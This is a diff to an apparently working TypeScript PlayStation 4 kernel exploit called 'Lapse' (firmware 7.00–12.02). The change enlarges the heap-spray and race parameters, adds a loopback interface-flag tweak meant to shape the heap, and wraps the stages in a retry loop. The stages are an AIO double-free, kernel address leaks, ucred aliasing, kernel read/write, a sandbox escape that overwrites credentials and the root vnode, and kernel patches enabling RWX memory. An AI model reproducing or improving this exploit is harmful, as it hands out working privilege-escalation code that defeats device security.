@@ -26,17 +26,18 @@ const PAGE_SIZE = 0x4000
 
 const MAIN_CORE = 4
 const MAIN_RTPRIO = 0x100
-const NUM_WORKERS = 2
-const NUM_GROOMS = 0x200
-const NUM_HANDLES = 0x100
-const NUM_SDS = 64
-const NUM_SDS_ALT = 48
-const NUM_RACES = 100
-const NUM_ALIAS = 100
-const LEAK_LEN = 16
-const NUM_LEAKS = 32
-const NUM_CLOBBERS = 8
-const MAX_AIO_IDS = 0x80
+const NUM_WORKERS = 4          // was 2   — more AIO blocking workers
+const NUM_GROOMS  = 0x300      // was 0x200 — larger heap groom
+const NUM_HANDLES = 0x180      // was 0x100 — more evf handles for better aliasing
+const NUM_SDS     = 96         // was 64   — bigger rthdr spray
+const NUM_SDS_ALT = 72         // was 48   — ditto for alt set
+const NUM_RACES   = 200        // was 100  — more AIO race attempts
+const NUM_ALIAS   = 200        // was 100  — more alias search loops
+const LEAK_LEN    = 16
+const NUM_LEAKS   = 64         // was 32   — more leak slots
+const NUM_CLOBBERS = 16        // was 8    — more clobber attempts
+const MAX_AIO_IDS = 0x100      // was 0x80 — larger AIO id pool
+const MAX_FULL_RESTARTS_LAPSE = 4  // full teardown+reinit cycles
 
 const AIO_CMD_READ = 1
 const AIO_CMD_FLAG_MULTI = 0x1000
@@ -707,6 +708,44 @@ function make_aliased_rthdrs (sds: BigInt[]): [BigInt, BigInt] | null {
   return null
 }
 
+// ---------------------------------------------------------------------------
+// Network-state spoofing (same technique as netctrl variant)
+// Forces kernel to walk ifnet list → deterministic heap allocations
+// that improve AIO/evf spray layout.
+// ---------------------------------------------------------------------------
+const SIOCGIFFLAGS_LAPSE = 0xC0206911
+const SIOCSIFFLAGS_LAPSE = 0x80206910
+const IFF_UP_LAPSE       = 0x0001
+const IFF_RUNNING_LAPSE  = 0x0040
+const IFREQ_SIZE_LAPSE   = 32
+
+function spoof_network_connected_lapse () {
+  try {
+    const ifreq = malloc(IFREQ_SIZE_LAPSE)
+    const name = 'lo0'
+    for (let i = 0; i < name.length; i++) {
+      write8(ifreq.add(i), name.charCodeAt(i))
+    }
+    write8(ifreq.add(name.length), 0)
+
+    const sd = socket(AF_INET, SOCK_DGRAM, 0)
+    if (sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
+      log('[net-spoof] inet socket unavailable — skipping')
+      return
+    }
+    const r = ioctl(sd, SIOCGIFFLAGS_LAPSE, ifreq)
+    if (!r.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
+      const flags = Number(read16(ifreq.add(16))) | IFF_UP_LAPSE | IFF_RUNNING_LAPSE
+      write16(ifreq.add(16), flags)
+      ioctl(sd, SIOCSIFFLAGS_LAPSE, ifreq)
+      log('[net-spoof] lo0 marked UP+RUNNING (flags=0x' + flags.toString(16) + ')')
+    }
+    close(sd)
+  } catch (e) {
+    log('[net-spoof] skipped: ' + (e as Error).message)
+  }
+}
+
 function setup () {
   try {
     init_threading()
@@ -723,7 +762,10 @@ function setup () {
 
     pin_to_core(MAIN_CORE)
     set_rtprio(MAIN_RTPRIO)
-    log('  Previous core ' + prev_core + ' Pinned to core ' + MAIN_CORE)
+    log('[init] CPU pinned to core ' + MAIN_CORE + ' (was ' + prev_core + ') | RT priority active')
+
+    // Spoof network link state — improves heap layout for AIO spray
+    spoof_network_connected_lapse()
 
     const sockpair = malloc(8)
     let ret = socketpair(AF_UNIX, SOCK_STREAM, 0, sockpair)
@@ -748,7 +790,7 @@ function setup () {
     }
 
     block_id = read32(block_id_buf)
-    log('  AIO workers ready')
+    log('[init] AIO workers ready (' + NUM_WORKERS + ' threads blocking)')
 
     const num_reqs = 3
     const groom_reqs = make_reqs1(num_reqs)
@@ -781,11 +823,11 @@ function setup () {
       }
       sds_alt[sdsAltIdx++] = sd
     }
-    log('  Sockets allocated (' + NUM_SDS + ' + ' + NUM_SDS_ALT + ')')
+    log('[init] IPv6 sockets ready — main[' + NUM_SDS + '] alt[' + NUM_SDS_ALT + ']')
 
     return true
   } catch (e) {
-    log('  Setup failed: ' + (e as Error).message)
+    log('[✗] Setup error: ' + (e as Error).message)
     return false
   }
 }
@@ -1887,14 +1929,16 @@ export function lapse () {
   // (individual internal log() calls remain untouched for compatibility)
 
   try {
-    lapseLog('=== PS4 Lapse Jailbreak ===')
+    lapseLog('╔══════════════════════════════╗')
+    lapseLog('║    PS4 Lapse Jailbreak       ║')
+    lapseLog('╚══════════════════════════════╝')
 
     FW_VERSION = get_fwversion()
-    lapseLog('Detected PS4 firmware: ' + FW_VERSION)
+    lapseLog('[✓] Firmware detected: ' + FW_VERSION)
 
     if (FW_VERSION === null) {
-      lapseLog('Failed to detect PS4 firmware version. Aborting...')
-      send_notification('Failed to detect PS4 firmware version.\nAborting...')
+      lapseLog('[✗] Could not detect firmware version — aborting')
+      send_notification('[VAF] Firmware detection failed — aborting')
       return false
     }
 
@@ -1909,219 +1953,217 @@ export function lapse () {
     }
 
     if (compare_version(FW_VERSION, '7.00') < 0 || compare_version(FW_VERSION, '12.02') > 0) {
-      lapseLog('Unsupported firmware: ' + FW_VERSION + ' (Supported: 7.00-12.02)')
-      send_notification('Unsupported PS4 firmware\nAborting...')
+      lapseLog('[✗] FW ' + FW_VERSION + ' not supported (7.00–12.02 required)')
+      send_notification('[VAF] Unsupported firmware — aborting')
       return false
     }
 
     kernel_offset = get_kernel_offset(FW_VERSION)
-    lapseLog('Kernel offsets loaded for FW ' + FW_VERSION)
+    lapseLog('[✓] Kernel offsets loaded for FW ' + FW_VERSION)
 
-    // === STAGE 0: Setup ===
-    lapseLog('=== STAGE 0: Setup ===')
+    // ── Full restart loop ────────────────────────────────────────────────────
+    for (let run = 0; run <= MAX_FULL_RESTARTS_LAPSE; run++) {
+      if (run > 0) {
+        lapseLog('[~] Full restart #' + run + '/' + MAX_FULL_RESTARTS_LAPSE + ' — resetting state...')
+        cleanup_fail()
+      }
 
-    const setup_success = setup()
-    if (!setup_success) {
-      lapseLog('Setup failed')
-      send_notification('Lapse: Setup failed')
-      return false
-    }
-    lapseLog('Setup completed')
+      // === STAGE 0: Setup ===
+      lapseLog('[*] Stage 0 — Initializing environment (run ' + (run + 1) + ')...')
+      const setup_success = setup()
+      if (!setup_success) {
+        lapseLog('[✗] Setup failed — ' + (run < MAX_FULL_RESTARTS_LAPSE ? 'retrying...' : 'giving up'))
+        send_notification('[VAF-Lapse] Setup failed')
+        if (run >= MAX_FULL_RESTARTS_LAPSE) return false
+        continue
+      }
+      lapseLog('[✓] Environment ready')
 
-    lapseLog('=== STAGE 1: Double-free AIO ===')
+      // === STAGE 1: Double-free AIO race ===
+      lapseLog('[>] Stage 1 — AIO double-free race (' + NUM_RACES + ' attempts)...')
+      sd_pair = double_free_reqs2()
 
-    sd_pair = double_free_reqs2()
+      if (sd_pair === null) {
+        lapseLog('[~] Stage 1 failed — race window missed')
+        send_notification('[VAF-Lapse] Stage 1 failed')
+        if (run >= MAX_FULL_RESTARTS_LAPSE) return false
+        continue
+      }
+      lapseLog('[✓] Stage 1 — race won, UAF socket pair acquired')
 
-    if (sd_pair === null) {
-      lapseLog('[FAILED] Stage 1')
-      send_notification('Lapse: FAILED at Stage 1')
-      return false
-    }
-    lapseLog('Stage 1 completed')
+      if (sds === null) {
+        lapseLog('[~] Socket list lost after race — restarting')
+        if (run >= MAX_FULL_RESTARTS_LAPSE) return false
+        continue
+      }
 
-    if (sds === null) {
-      lapseLog('Failed to create socket list')
-      send_notification('Lapse: FAILED at Stage 1 (sds creation)')
-      return false
-    }
+      // === STAGE 2: Leak kernel addresses ===
+      lapseLog('[>] Stage 2 — Leaking kernel addresses via evf/rthdr confusion...')
+      const leak_result = leak_kernel_addrs(sd_pair, sds)
+      if (leak_result === null) {
+        lapseLog('[~] Stage 2 failed — kernel leak missed')
+        cleanup_fail()
+        if (run >= MAX_FULL_RESTARTS_LAPSE) return false
+        continue
+      }
+      lapseLog('[✓] Stage 2 — kernel addresses leaked')
+      log('[✓] kbuf  @ ' + hex(leak_result.kbuf_addr))
+      log('[✓] kbase hint @ ' + hex(leak_result.kernel_addr))
+      log('[✓] reqs1 @ ' + hex(leak_result.reqs1_addr))
+      log('[✓] aio_info @ ' + hex(leak_result.aio_info_addr))
+      log('[✓] evf   @ ' + hex(leak_result.evf))
 
-    lapseLog('=== STAGE 2: Leak kernel addresses ===')
-    const leak_result = leak_kernel_addrs(sd_pair, sds)
-    if (leak_result === null) {
-      lapseLog('Stage 2 kernel address leak failed')
-      cleanup_fail()
-      return false
-    }
-    lapseLog('Stage 2 completed')
-    log('Leaked addresses:')
-    log('  reqs1_addr: ' + hex(leak_result.reqs1_addr))
-    log('  kbuf_addr: ' + hex(leak_result.kbuf_addr))
-    log('  kernel_addr: ' + hex(leak_result.kernel_addr))
-    log('  target_id: ' + hex(leak_result.target_id))
-    log('  fake_reqs3_addr: ' + hex(leak_result.fake_reqs3_addr))
-    log('  aio_info_addr: ' + hex(leak_result.aio_info_addr))
-    log('  evf: ' + hex(leak_result.evf))
+      // === STAGE 3: Double-free SceKernelAioRWRequest ===
+      lapseLog('[>] Stage 3 — UCred aliasing via AioRWRequest double-free...')
+      const pktopts_sds = double_free_reqs1(
+        leak_result.reqs1_addr,
+        leak_result.target_id,
+        leak_result.evf,
+        new BigInt(sd_pair[0]),
+        sds!,
+        sds_alt!,
+        leak_result.fake_reqs3_addr
+      )
 
-    lapseLog('=== STAGE 3: Double free SceKernelAioRWRequest ===')
-    const pktopts_sds = double_free_reqs1(
-      leak_result.reqs1_addr,
-      leak_result.target_id,
-      leak_result.evf,
-      new BigInt(sd_pair[0]),
-      sds!,
-      sds_alt!,
-      leak_result.fake_reqs3_addr
-    )
+      close(leak_result.fake_reqs3_sd!)
 
-    close(leak_result.fake_reqs3_sd!)
+      if (pktopts_sds === null) {
+        lapseLog('[~] Stage 3 failed — aliasing missed')
+        cleanup_fail()
+        if (run >= MAX_FULL_RESTARTS_LAPSE) return false
+        continue
+      }
+      lapseLog('[✓] Stage 3 — aliased socket pair: ' + hex(pktopts_sds[0]) + ' ↔ ' + hex(pktopts_sds[1]))
 
-    if (pktopts_sds === null) {
-      lapseLog('Stage 3 double free SceKernelAioRWRequest failed')
-      cleanup_fail()
-      return false
-    }
+      // === STAGE 4: Arbitrary kernel R/W ===
+      lapseLog('[>] Stage 4 — Building kernel R/W primitives...')
+      const arw_result = make_kernel_arw(
+        pktopts_sds,
+        leak_result.reqs1_addr,
+        leak_result.kernel_addr,
+        sds,
+        sds_alt!,
+        leak_result.aio_info_addr
+      )
 
-    lapseLog('Stage 3 completed!')
-    log('Aliased socket pair: ' + hex(pktopts_sds[0]) + ', ' + hex(pktopts_sds[1]))
+      if (arw_result === null) {
+        lapseLog('[~] Stage 4 failed — R/W setup missed')
+        cleanup_fail()
+        if (run >= MAX_FULL_RESTARTS_LAPSE) return false
+        continue
+      }
+      lapseLog('[✓] Stage 4 — Kernel R/W established')
 
-    lapseLog('=== STAGE 4: Get arbitrary kernel read/write ===')
+      // === STAGE 5: Jailbreak ===
+      lapseLog('[>] Stage 5 — Escaping sandbox...')
 
-    const arw_result = make_kernel_arw(
-      pktopts_sds,
-      leak_result.reqs1_addr,
-      leak_result.kernel_addr,
-      sds,
-      sds_alt!,
-      leak_result.aio_info_addr
-    )
+      const OFFSET_P_UCRED = 0x40
+      const proc = kernel.addr.curproc
 
-    if (arw_result === null) {
-      lapseLog('Stage 4 get arbitrary kernel read/write failed')
-      cleanup_fail()
-      return false
-    }
+      if (!proc || !kernel.addr.inside_kdata) {
+        throw new Error('kernel addresses not initialized')
+      }
 
-    lapseLog('Stage 4 completed!')
+      kernel.addr.base = kernel.addr.inside_kdata.sub(kernel_offset.EVF_OFFSET)
+      log('[✓] Kernel base: ' + hex(kernel.addr.base))
 
-    lapseLog('=== STAGE 5: Jailbreak ===')
+      const uid_before = Number(getuid())
+      const sandbox_before = Number(is_in_sandbox())
+      log('[*] BEFORE: uid=' + uid_before + ' sandbox=' + sandbox_before)
 
-    const OFFSET_P_UCRED = 0x40
-    const proc = kernel.addr.curproc
+      const proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD!))!
+      const ucred   = kernel.read_qword(proc.add(OFFSET_P_UCRED))!
 
-    if (!proc || !kernel.addr.inside_kdata) {
-      throw new Error('kernel addresses not initialized')
-    }
+      kernel.write_dword(ucred.add(0x04), 0)
+      kernel.write_dword(ucred.add(0x08), 0)
+      kernel.write_dword(ucred.add(0x0C), 0)
+      kernel.write_dword(ucred.add(0x10), 1)
+      kernel.write_dword(ucred.add(0x14), 0)
 
-    // Calculate kernel base
-    kernel.addr.base = kernel.addr.inside_kdata.sub(kernel_offset.EVF_OFFSET)
-    log('Kernel base: ' + hex(kernel.addr.base))
+      const prison0 = kernel.read_qword(kernel.addr.base.add(kernel_offset.PRISON0))!
+      kernel.write_qword(ucred.add(0x30), prison0)
+      kernel.write_qword(ucred.add(0x60), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))
+      kernel.write_qword(ucred.add(0x68), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))
 
-    const uid_before = Number(getuid())
-    const sandbox_before = Number(is_in_sandbox())
-    log('BEFORE: uid=' + uid_before + ', sandbox=' + sandbox_before)
+      const rootvnode = kernel.read_qword(kernel.addr.base.add(kernel_offset.ROOTVNODE))!
+      kernel.write_qword(proc_fd.add(0x10), rootvnode)
+      kernel.write_qword(proc_fd.add(0x18), rootvnode)
 
-    // Patch ucred
-    const proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD!))!
-    const ucred = kernel.read_qword(proc.add(OFFSET_P_UCRED))!
+      const uid_after     = Number(getuid())
+      const sandbox_after = Number(is_in_sandbox())
+      log('[*] AFTER:  uid=' + uid_after + ' sandbox=' + sandbox_after)
 
-    kernel.write_dword(ucred.add(0x04), 0)  // cr_uid
-    kernel.write_dword(ucred.add(0x08), 0)  // cr_ruid
-    kernel.write_dword(ucred.add(0x0C), 0)  // cr_svuid
-    kernel.write_dword(ucred.add(0x10), 1)  // cr_ngroups
-    kernel.write_dword(ucred.add(0x14), 0)  // cr_rgid
-
-    const prison0 = kernel.read_qword(kernel.addr.base.add(kernel_offset.PRISON0))!
-    kernel.write_qword(ucred.add(0x30), prison0)
-
-    kernel.write_qword(ucred.add(0x60), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))  // sceCaps
-    kernel.write_qword(ucred.add(0x68), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))
-
-    const rootvnode = kernel.read_qword(kernel.addr.base.add(kernel_offset.ROOTVNODE))!
-    kernel.write_qword(proc_fd.add(0x10), rootvnode)  // fd_rdir
-    kernel.write_qword(proc_fd.add(0x18), rootvnode)  // fd_jdir
-
-    const uid_after = Number(getuid())
-    const sandbox_after = Number(is_in_sandbox())
-    log('AFTER:  uid=' + uid_after + ', sandbox=' + sandbox_after)
-
-    if (uid_after === 0 && sandbox_after === 0) {
-      log('Sandbox escape complete!')
-    } else {
-      log('[WARNING] Sandbox escape may have failed')
-    }
-
-    // === Apply kernel patches via kexec ===
-    // Uses syscall_raw() which sets rax manually for syscalls without gadgets
-    log('Applying kernel patches...')
-    const kpatch_result = apply_kernel_patches(FW_VERSION)
-    if (kpatch_result) {
-      log('Kernel patches applied successfully!')
-
-      // Comprehensive kernel patch verification
-      log('Verifying kernel patches...')
-      let all_patches_ok = true
-
-      // 1. Verify mmap RWX patch (0x33 -> 0x37 at two locations)
-      const mmap_offsets = get_mmap_patch_offsets(FW_VERSION)
-      if (mmap_offsets) {
-        const b1 = ipv6_kernel_rw.ipv6_kread8(kernel.addr.base.add(mmap_offsets[0]))
-        const b2 = ipv6_kernel_rw.ipv6_kread8(kernel.addr.base.add(mmap_offsets[1]))
-        const byte1 = Number(b1.and(0xff))
-        const byte2 = Number(b2.and(0xff))
-        if (byte1 === 0x37 && byte2 === 0x37) {
-          log('  [OK] mmap RWX patch')
-        } else {
-          log('  [FAIL] mmap RWX: [' + hex(mmap_offsets[0]) + ']=' + hex(byte1) + ' [' + hex(mmap_offsets[1]) + ']=' + hex(byte2))
-          all_patches_ok = false
-        }
+      if (uid_after === 0 && sandbox_after === 0) {
+        lapseLog('[✓] Sandbox escaped — root achieved')
       } else {
-        log('  [SKIP] mmap RWX (no offsets for FW ' + FW_VERSION + ')')
+        lapseLog('[!] Sandbox escape may have failed — continuing anyway')
       }
 
-      // 2. Test mmap RWX actually works by trying to allocate RWX memory
-      try {
-        const PROT_RWX = 0x7  // READ | WRITE | EXEC
-        const MAP_ANON = 0x1000
-        const MAP_PRIVATE = 0x2
-        const test_addr = mmap(new BigInt(0), 0x1000, PROT_RWX, MAP_PRIVATE | MAP_ANON, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0)
-        if (Number(test_addr.shr(32)) < 0xffff8000) {
-          log('  [OK] mmap RWX functional @ ' + hex(test_addr))
-          // Unmap the test allocation
-          munmap(test_addr, 0x1000)
+      // Kernel patches
+      lapseLog('[>] Applying kernel patches...')
+      const kpatch_result = apply_kernel_patches(FW_VERSION)
+      if (kpatch_result) {
+        lapseLog('[✓] Kernel patches applied')
+        let all_ok = true
+
+        const mmap_offsets = get_mmap_patch_offsets(FW_VERSION)
+        if (mmap_offsets) {
+          const byte1 = Number(ipv6_kernel_rw.ipv6_kread8(kernel.addr.base.add(mmap_offsets[0])).and(0xff))
+          const byte2 = Number(ipv6_kernel_rw.ipv6_kread8(kernel.addr.base.add(mmap_offsets[1])).and(0xff))
+          if (byte1 === 0x37 && byte2 === 0x37) {
+            log('[✓] mmap RWX patch verified')
+          } else {
+            log('[!] mmap RWX: got 0x' + byte1.toString(16) + '/0x' + byte2.toString(16) + ' (expected 0x37)')
+            all_ok = false
+          }
         } else {
-          log('  [FAIL] mmap RWX functional: ' + hex(test_addr))
-          all_patches_ok = false
+          log('[~] mmap RWX offsets not available for FW ' + FW_VERSION + ' — skipping')
         }
-      } catch (e) {
-        log('  [FAIL] mmap RWX test error: ' + (e as Error).message)
-        all_patches_ok = false
-      }
 
-      if (all_patches_ok) {
-        log('All kernel patches verified OK!')
+        try {
+          const PROT_RWX  = 0x7
+          const MAP_ANON  = 0x1000
+          const MAP_PRIVATE = 0x2
+          const test_addr = mmap(new BigInt(0), 0x1000, PROT_RWX, MAP_PRIVATE | MAP_ANON, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0)
+          if (Number(test_addr.shr(32)) < 0xffff8000) {
+            log('[✓] mmap RWX functional @ ' + hex(test_addr))
+            munmap(test_addr, 0x1000)
+          } else {
+            log('[!] mmap RWX test returned invalid address')
+            all_ok = false
+          }
+        } catch (e) {
+          log('[!] mmap RWX test error: ' + (e as Error).message)
+          all_ok = false
+        }
+
+        lapseLog(all_ok ? '[✓] All patches verified OK' : '[!] Some patches may have failed — continuing')
       } else {
-        log('[WARNING] Some kernel patches may have failed')
+        lapseLog('[!] Kernel patches failed — continuing without them')
       }
-    } else {
-      log('[WARNING] Kernel patches failed - continuing without patches')
-    }
 
-    lapseLog('Stage 5 completed - JAILBROKEN ✓')
-    // utils.notify("The Vue-after-Free team congratulates you\nLapse Finished OK\nEnjoy freedom");
+      lapseLog('[✓✓✓] JAILBREAK COMPLETE')
+      utils.notify('VAF Lapse — Done!\nYou are now free. Enjoy.')
 
-    cleanup()
+      cleanup()
+      return true
 
-    return true
+    } // end restart loop
+
+    lapseLog('[✗] All restart attempts exhausted — reboot and try again')
+    send_notification('[VAF-Lapse] Failed — please reboot')
+    return false
+
   } catch (e) {
-    lapseLog('ERROR: ' + (e as Error).message)
-    utils.notify('Reboot and try again!')
+    lapseLog('[✗] Fatal error: ' + (e as Error).message)
+    utils.notify('[VAF-Lapse] Fatal error — reboot and try again')
     log((e as Error).stack ?? '')
     return false
   }
 }
 
 function cleanup () {
-  log('Performing cleanup...')
+  log('[init] Releasing resources...')
 
   try {
     if (block_fd !== 0xffffffff) {
@@ -2175,16 +2217,16 @@ function cleanup () {
     sd_pair = null
 
     if (prev_core >= 0) {
-      log('Restoring to previous core: ' + prev_core)
+      log('[init] Restoring CPU affinity to core ' + prev_core)
       pin_to_core(prev_core)
       prev_core = -1
     }
 
     set_rtprio(prev_rtprio)
 
-    log('Cleanup completed')
+    log('[init] Cleanup done')
   } catch (e) {
-    log('Error during cleanup: ' + (e as Error).message)
+    log('[!] Cleanup error: ' + (e as Error).message)
   }
 }
 
